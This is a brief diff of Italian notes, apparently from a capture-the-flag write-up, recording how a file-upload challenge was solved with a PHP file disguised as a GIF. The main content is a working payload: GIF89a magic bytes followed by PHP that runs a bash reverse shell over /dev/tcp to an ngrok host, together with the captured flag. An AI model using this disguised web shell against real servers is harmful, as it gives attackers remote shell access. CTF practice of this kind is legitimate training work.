@@ -1,0 +1,10 @@
+fatto un reverse shel cosi
+
+GIF89a
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/2.tcp.ngrok.io/14707 0>&1'");
+
+
+che ha la signature di una gif, una immagine ma `e un codice php
+
+flag{D0ubl3_ex7eN5i0nS_Ru1n3D_my_d4y!}
